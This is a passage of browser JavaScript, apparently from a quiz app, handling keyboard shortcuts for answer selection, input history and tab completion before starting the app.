  if (!R || R.over || e.metaKey || e.ctrlKey || e.altKey) return;
  const q = Q[R.qs[R.i]], u = R.u[R.i];
  if (e.target.id === 'tin') {
    const t = e.target;
    if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
      e.preventDefault(); if (!u.hist.length) return;
      u.hp = u.hp < 0 ? u.hist.length : u.hp;
      u.hp = Math.max(0, Math.min(u.hist.length, u.hp + (e.key === 'ArrowUp' ? -1 : 1)));
      t.value = u.hist[u.hp] || '';
    } else if (e.key === 'Tab') { e.preventDefault(); t.value = complete(q, u, t.value); }
    return;
  }
  if (/^(INPUT|SELECT|TEXTAREA)$/.test(e.target.tagName)) return;
  if (e.key === 'Enter') { if (e.target.tagName === 'BUTTON') return; const go = $('#go'); if (go && !go.disabled) { e.preventDefault(); go.click(); } return; }
  if (q.type !== 'mcq' || u.done || R.review) return;
  const k = e.key.toLowerCase(), pos = 'abcdef'.indexOf(k) >= 0 && k.length === 1 ? 'abcdef'.indexOf(k) : '123456'.indexOf(k);
  if (pos >= 0 && k.length === 1 && pos < u.perm.length) { u.pick = u.perm[pos]; renderQ(); }
});

boot();
})();
</script>
